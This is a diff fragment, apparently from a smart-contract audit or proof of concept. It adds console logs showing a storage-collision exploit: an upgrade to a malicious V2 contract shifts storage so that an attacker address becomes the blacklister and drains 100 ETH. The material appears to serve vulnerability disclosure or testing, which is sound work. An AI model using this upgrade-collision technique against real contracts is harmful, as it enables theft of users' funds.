@@ -174,3 +174,33 @@ contract V2Malicious {
     
     receive() external payable {}
 }
+
+```solidity
+Logs:
+  
+========== STORAGE COLLISION EXPLOIT ==========
+  
+[1] DEPLOYING V1
+  Blacklister in V1: 0x0000000000000000000000000000000000000002
+  Storage Slot 0: 0x0000000000000000000000000000000000000000000000000000000000000002
+  Storage Slot 1: 0x0000000000000000000000000000000000000000000000000000000000000000
+  
+[2] DEPLOYING MALICIOUS V2
+  Injected attacker address into slot 1
+  Upgraded to V2 (storage layout shifted)
+  
+[3] STORAGE CORRUPTION ACTIVE
+  Blacklister in V2: 0x0000000000000000000000000000000000001337
+  Expected: 0x0000000000000000000000000000000000000002
+  Actual: 0x0000000000000000000000000000000000001337
+  
+[4] EXPLOITING
+  Attacker balance before: 0 ETH
+  Contract balance before: 100 ETH
+  Attacker balance after: 100 ETH
+  Contract balance after: 0 ETH
+  
+  ATTACK SUCCESSFUL: Storage collision allowed complete takeover
+
+```
+
